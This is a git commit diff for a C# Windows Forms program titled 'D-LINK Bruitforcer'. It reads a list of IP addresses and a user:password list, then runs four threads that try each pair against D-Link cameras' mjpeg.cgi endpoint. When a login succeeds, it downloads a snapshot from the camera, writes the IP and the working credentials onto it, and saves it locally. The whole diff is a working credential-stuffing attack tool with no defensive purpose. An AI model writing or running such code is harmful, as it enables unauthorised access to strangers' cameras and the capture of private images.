cc3cf2774d7e057f17c9150f3f14f9cdfca0803a
jake hartley <puffleboy101@hotmail.co.uk>
2018-12-19 21:49:08 +0000

    -

--- dlinktester/Form1.Designer.cs
+++ dlinktester/Form1.Designer.cs
@@ -28,13 +28,114 @@
         /// </summary>
         private void InitializeComponent()
         {
-            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Location = new System.Drawing.Point(93, 12);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(248, 225);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(12, 12);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "IP LIST";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(12, 41);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 2;
+            this.button2.Text = "PASSLIST";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(12, 70);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(75, 23);
+            this.button3.TabIndex = 5;
+            this.button3.Text = "START";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // listBox1
+            // 
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.Location = new System.Drawing.Point(347, 12);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(170, 225);
+            this.listBox1.TabIndex = 6;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(12, 220);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(13, 13);
+            this.label1.TabIndex = 7;
+            this.label1.Text = "$";
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(12, 99);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(61, 30);
+            this.checkBox1.TabIndex = 8;
+            this.checkBox1.Text = "random\r\nip order";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(800, 450);
-            this.Text = "Form1";
+            this.ClientSize = new System.Drawing.Size(527, 247);
+            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.listBox1);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.pictureBox1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "D-LINK Bruitforcer";
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
         }
 
         #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.ListBox listBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.CheckBox checkBox1;
     }
 }
 
--- dlinktester/Form1.cs
+++ dlinktester/Form1.cs
@@ -3,8 +3,13 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
 using System.Linq;
+using System.Net;
+using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -12,9 +17,181 @@ namespace dlinktester
 {
     public partial class Form1 : Form
     {
+        public string[] IPs;
+        public string[] Userlist;
+        public string ipsFileName;
+        public string passlistFileName;
+        public int counter;
+        public int iplen;
+
         public Form1()
         {
             InitializeComponent();
+        }
+
+        public class MyWebClient : WebClient
+        {
+            protected override WebRequest GetWebRequest(Uri address)
+            {
+                var req = base.GetWebRequest(address);
+                req.Timeout = 5000;
+                return req;
+            }
+        }
+
+        public void testThread(string[] IPs, string[] Userlist)
+        {
+            //begin testing
+            for (int i = 0; i < IPs.Length; i++)
+            {
+                this.Invoke(new MethodInvoker(delegate ()
+                {
+                    counter++;
+                    label1.Text = (counter + " / " + iplen);
+                }));
+                for (int o = 0; o < Userlist.Length; o++)
+                {
+                    using (MyWebClient client = new MyWebClient())
+                    {
+                        string currentip = IPs[i];
+                        if (currentip.EndsWith(":"))
+                        {
+                            currentip = currentip.Remove(currentip.Length - 1);
+                        }
+                        Bitmap b;
+                        string[] currentcreds = Userlist[o].Split(':');
+                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + currentip + "/mjpeg.cgi");
+                        request.Method = "GET";
+                        request.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
+                        request.Timeout = 2000;
+                        Console.WriteLine(currentcreds[0] + " : " + currentcreds[1]);
+                        try
+                        {
+                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                            if (response.StatusCode == HttpStatusCode.OK)
+                            {
+                                Console.WriteLine("GOT 200");
+                                client.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
+                                byte[] image = client.DownloadData("http://" + currentip + "/image.jpg");
+                                using (var ms = new MemoryStream(image))
+                                {
+                                    b = new Bitmap(ms);
+                                }
+                                using (Graphics graphics = Graphics.FromImage(b))
+                                {
+                                    PointF firstLocation = new PointF(10f, 10f);
+                                    PointF secondLocation = new PointF(10f, 24f);
+                                    Font lucFont = new Font("Lucida Console", 10);
+                                    PointF Pointvar = new PointF(10f, 10f);
+                                    PointF Pointvar2 = new PointF(10f, 24f);
+                                    SizeF size = graphics.MeasureString(currentip, lucFont);
+                                    SizeF size2 = graphics.MeasureString(currentcreds[0] + " : " + currentcreds[1], lucFont);
+                                    RectangleF rect = new RectangleF(Pointvar, size);
+                                    RectangleF rect2 = new RectangleF(Pointvar2, size2);
+                                    graphics.FillRectangle(Brushes.Black, rect);
+                                    graphics.FillRectangle(Brushes.Black, rect2);
+                                    graphics.DrawString(currentip, lucFont, Brushes.White, firstLocation);
+                                    graphics.DrawString(currentcreds[0] + " : " + currentcreds[1], lucFont, Brushes.White, secondLocation);
+                                    graphics.Dispose();
+                                }
+                                this.Invoke(new MethodInvoker(delegate ()
+                                {
+                                    listBox1.Items.Add(currentip);
+                                    pictureBox1.Image = new Bitmap(b);
+                                }));
+                                Random random = new Random();
+                                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                                string rand = new string(Enumerable.Repeat(chars, 5).Select(s => s[random.Next(s.Length)]).ToArray());
+                                b.Save(@"C:\Users\puffl\Documents\aztech shiz\dlink" + @"\" + rand +".jpg", ImageFormat.Jpeg);
+                                b.Dispose();
+                                break;
+                            }
+                            else
+                            {
+                                //Console.WriteLine((int)response.StatusCode);
+                            }
+                        }
+                        catch(Exception ex)
+                        {
+                            Console.WriteLine(ex);
+                        }
+
+                    }
+                }
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog dlg = new OpenFileDialog())
+            {
+                dlg.Title = "Open IP file";
+                dlg.Filter = "Text files | *.txt";
+
+                if (dlg.ShowDialog() == DialogResult.OK)
+                {
+                    ipsFileName = dlg.FileName;
+                    IPs = System.IO.File.ReadAllLines(ipsFileName).ToArray();
+                    iplen = IPs.Length;
+                    label1.Text = ("0 / " + iplen);
+                    button1.ForeColor = Color.Green;
+                }
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog dlg = new OpenFileDialog())
+            {
+                dlg.Title = "Open Passlist file";
+                dlg.Filter = "Text files | *.txt";
+
+                if (dlg.ShowDialog() == DialogResult.OK)
+                {
+                    passlistFileName = dlg.FileName;
+                    Userlist = System.IO.File.ReadAllLines(passlistFileName).ToArray();
+                    button2.ForeColor = Color.Green;
+                }
+            }
+        }
+
+        public static int GetNextInt32(RNGCryptoServiceProvider rnd)
+        {
+            byte[] randomInt = new byte[4];
+            rnd.GetBytes(randomInt);
+            return Convert.ToInt32(randomInt[0]);
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+
+            if (checkBox1.Checked)
+            {
+                RNGCryptoServiceProvider rnd2 = new RNGCryptoServiceProvider(); //may be overdoing it a little
+                string[] IPs2 = IPs.OrderBy(x => GetNextInt32(rnd2)).ToArray();
+                IPs = IPs2;
+            }
+
+            string[] Ofirstsplit = IPs.Take(IPs.Length / 2).ToArray();
+            string[] Osecondsplit = IPs.Skip(IPs.Length / 2).ToArray();
+
+            string[] firstsplit = Ofirstsplit.Take(Ofirstsplit.Length / 2).ToArray();
+            string[] secondsplit = Ofirstsplit.Skip(Ofirstsplit.Length / 2).ToArray();
+            string[] thirdsplit = Osecondsplit.Take(Osecondsplit.Length / 2).ToArray();
+            string[] forthsplit = Osecondsplit.Skip(Osecondsplit.Length / 2).ToArray();
+
+            Thread a = new Thread(() => testThread(firstsplit, Userlist));
+            Thread b = new Thread(() => testThread(secondsplit, Userlist));
+            Thread c = new Thread(() => testThread(thirdsplit, Userlist));
+            Thread d = new Thread(() => testThread(forthsplit, Userlist));
+            a.IsBackground = true;
+            b.IsBackground = true;
+            c.IsBackground = true;
+            d.IsBackground = true;
+            a.Start();
+            b.Start();
+            c.Start();
+            d.Start();
         }
     }
 }
